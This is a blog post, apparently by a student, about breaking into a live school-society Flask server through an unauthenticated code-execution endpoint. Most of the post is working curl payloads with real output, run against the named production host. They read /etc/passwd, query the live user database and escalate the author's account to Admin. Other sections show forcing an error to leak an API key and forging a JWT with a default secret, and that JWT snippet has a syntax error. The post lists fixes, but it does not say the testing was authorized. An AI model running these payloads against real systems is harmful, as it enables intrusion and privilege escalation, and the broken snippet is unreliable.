+++
title = "Smashing Mort's Server for Fun and No Profit 2"
description = "Ended up discovering a pretty critical RCE on the deployed server"
date = 2025-12-10
+++

Following the previous post, I had some ideas to try running a new path traversal technique and maybe searching for some other data leakage. 

## Another Path Traversal?

I ended up finding that the method to update `uid` contained the same flaw in parsing (with both the `os.path.join()` and the particular setter which allowed for file paths to be inserted):

```py
# model/user.py
@uid.setter
def user_id(self, uid):
    self._uid = uid
```

To my dismay, however, a check is run on `uid` to check whether or not it is a valid GitHub ID:

```py
# api/user.py
# check if uid is a GitHub account
_, status = GitHubUser().get(uid)
if status != 200:
    return {'message': f'User ID {uid} not a valid GitHub account' },
```

and thus:
```bash
curl -X PUT http://localhost:8001/api/user \
> -b cookie_regular.txt \
> -H "Content-Type: application/json" \
> -d '{ "uid": "test" }'
```

```json
{
    "message": "User ID test not a valid GitHub account"
}
```
***

## The RCE

While searching for another avenue of exploitation, I came across a function which allows for Python code the be executed with little to no moderation. Quite literally arbitrary code execution.

```py
# /api/python_exec_api.py
from flask import Blueprint, request, jsonify
from flask_restful import Api, Resource
import subprocess, tempfile, os

python_exec_api = Blueprint('python_exec_api', __name__, url_prefix='/run')
api = Api(python_exec_api)

class PythonExec(Resource):
    def post(self):
        """Executes submitted Python code safely in a short-lived subprocess."""
        data = request.get_json()
        code = data.get("code", "")

        if not code.strip():
            return {"output": "⚠️ No code provided."}, 400

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as tmp:
            tmp.write(code.encode())
            tmp.flush()

            try:
                result = subprocess.run(
                    ["python3", tmp.name],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                output = result.stdout + result.stderr
            except subprocess.TimeoutExpired:
                output = "⏱️ Execution timed out (5 s limit)."
            except Exception as e:
                output = f"Error running code: {str(e)}"
            finally:
                os.unlink(tmp.name)

        return {"output": output}

api.add_resource(PythonExec, "/python")
```

The endpoint allows **unauthenticated** arbitrary code execution! Huzzah! So, both locally *AND* online, I can send web requests to execute Python code. Funnily enough, the code (written by a competitor in CyberPatriot -- or rather, written via vibe coding) is effectively a backdoor into any downstream system including this one.

So, for example, I can grab `/etc/passwd`:
```bash
curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import os; print(os.popen(\"cat /etc/passwd\").read())"}'
```
```json
{"output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n\n"}
```

### Example of Privilege Escalation

In trying to find an easy way to do a privilege escalation without modifying the files of the actual server (although I definitely can -- see the demo), I realized you could simply load the actual Flask server's backend functionalities and use it to update my role in the database.

I first needed to figure out what I was working with, so I found my working directory:
```bash
curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import os\nprint(os.getcwd())"}'
```
```json
{"output": "/app\n"}
```

I then gathered some info on the system path to see how Python was being run on the deployed server:
```bash
curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import sys\nprint(sys.path)"}'
```
```json
{"output": "['/tmp', '/usr/local/lib/python312.zip', '/usr/local/lib/python3.12', '/usr/local/lib/python3.12/lib-dynload', '/usr/local/lib/python3.12/site-packages']\n"}
```

From there, I can decide where to load the backend functions from, then use that path to try gathering info from the DB (which is the route I took to minimize the destructiveness of this little show).
```bash
curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import sys\nsys.path.insert(0, '\''/app'\'')\nfrom __init__ import app, db\nfrom model.user import User\nwith app.app_context():\n    u = User.query.filter_by(_uid='\''mataiodoxion'\'').first()\n    print(u)"}'
```
```json
{"output": "{\"id\": <my id>, \"uid\": \"mataiodoxion\", \"name\": \"<my name>\", \"email\": \"<my email>\", \"sid\": \"<my sid>\", \"role\": \"User\", \"pfp\": \"\", \"class\": [\"CSP\"], \"kasm_server_needed\": false, \"grade_data\": {}, \"ap_exam\": {}, \"password\": \"<my password>\", \"school\": \"Del Norte High School\", \"sections\": []}\n"}
```
Here, we've gather my info from the actual DB (redacted for obvious reasons), but the interesting thing to take note of is that fact that my `role` is currently `"User"`.

In the payload, I've loaded the classes I'll be using with
```py
import sys
sys.path.insert(0, '/app')
from __init__ import app, db
from model.user import User
```

After that, it's just a simple use of the `User` class's functions to perform a SQL query:
```py
with app.app_context():
    u = User.query.filter_by(_uid='mataiodoxion').first()
    print(u) # print my data
```

From there, it's simply two additional lines to update my role and commit the changes to the DB:
```bash
curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import sys\nsys.path.insert(0, '\''/app'\'')\nfrom __init__ import app, db\nfrom model.user import User\nwith app.app_context():\n    u = User.query.filter_by(_uid='\''mataiodoxion'\'').first()\n    u.role = '\''Admin'\''\n    db.session.commit()\n    print(u)"}'
```

Notice the addition of setting the role and saving/closing the session:
```py
u.role = "Admin"
db.session.commit()
```

And with that, I've given myself `Admin` perms (notice the `role` field).
```json
{"output": "{\"id\": <my id>, \"uid\": \"mataiodoxion\", \"name\": \"<my name>\", \"email\": \"<my email>\", \"sid\": \"<my sid>\", \"role\": \"Admin\", \"pfp\": \"\", \"class\": [\"CSP\"], \"kasm_server_needed\": false, \"grade_data\": {}, \"ap_exam\": {}, \"password\": \"<my password>\", \"school\": \"Del Norte High School\", \"sections\": []}\n"}
```

On the actual live [website](https://flask.opencodingsociety.com), I was able to log in to my now admin account and view/interact with the user and KASM management pages. Great!

I can also grab ssh keys. I can even grab the `.env` if I wanted to, which would in theory expose the admin password, recovery passwords, db passwords, API keys, etc. I could also open reverse shells to gain *complete* access to the server if I wanted to. I can install malware, deface the website, DOS the server... the possibilities are endless.

In short, I smashed it.


### Solutions

The best solution, of course, would be to remove the endpoint entirely, but I haven't done much investigation into what (if anything) is even using this endpoint. As of now, the server is completely open to anybody running arbitrary code on the server, so I guess better me find it than some random person online :D

I'm sure there's likely some way to only permit authenticated people to use the endpoint (and giving that perm to only a few people) with `@token_required`, but really there's no good way to prevent an RCE with an open endpoint like this. It's also not even immediately clear what is actually using this endpoint so the best option of course would be to *scrap it entirely* or at least add some sort of containerization if it actually is necessary in any capacity
***

## Exposed API Keys

Looking into `flask/api/gemini_api.py`, we'll see that API keys are exposed in the URL responses:
```py
# api/gemini_api.py
# Build the endpoint url
endpoint = f"{server}?key={api_key}"
```

Thus, whenever an error occurs, th endpoint URL (with the API key) is returned to the client:
```py
error_details = {
    'status_code': response.status_code,
    'response_text': response.text,
    'endpoint': endpoint, # api key
    'headers': dict(response.headers)
}
```

We can force an error to leak the API key by sending a huge payload:
```bash
python3 -c "import json; print(json.dumps({'text': 'x' * 1000000}))" | \
curl -X POST https://flask.opencodingsociety.com/api/gemini \
  -H "Content-Type: application/json" \
  -b cookie.txt \
  -d @-
```

I'm not sure if this works yet, because at the time of writing this, I kept on hitting a rater limiter (error `429`) with Gemini. Theoretically, it should work though.

```json
{"message": "Rate limit exceeded. Please try again later.", "error_code": 429}
```

### Solution

Instead of returning the endpoint, we can instead log it without returning the endpoint:
```py
# api/gemini_api.py
current_app.logger.error(f"Gemini API error: {endpoint}")
return {
    'message': 'Gemini API error',
    'error_code': response.status_code
}, 500
```

***
## Free LLM Credits!

With the Groq API, no authentication is required, so anybody can use the Flask server's stored API key with Groq:
```py
# api/groq_api.py
class _Generate(resource):
    def post(self): # has no @token_required()
```

But alas, the server is safe again (like the path traversal) from no implementation yet!
```bash
curl -X POST https://flask.opencodingsociety.com/api/groq \
> -H "Content-Type: application/json" \
> -d '{ "messages": [{"role": "users", "content": "Generate 200 words about rust"}]}'
```

```json
{"message": "API key not configured"}
```

### Solution

The fix is simple here: just add a `token_required()` trait:
```py
class _Generate(Resource):
    @token_required()  # add this
    def post(self):
```
***

## Secret Keys

```py
# __init__.py
SECRET_KEY = os.environ.get('SECRET_KEY') or 'SECRET_KEY' # secret key for session management
```

If `SECRET_KEY` isn't set (as an env var), then it defaults to the literal string. From my previous RCE attack, I demonstrated I could overwrite files. Thus, if I wanted to, I could overwrite the `.env` file with this forge my own token to put in a backdoor:
```py
import jwt

secret = "SECRET_KEY"

# forge token
token = jwt.encode(
    {"_uid": "admin"},
    secret,
    algorithm:"HS256"
)
print(f"Token: {token}")
```
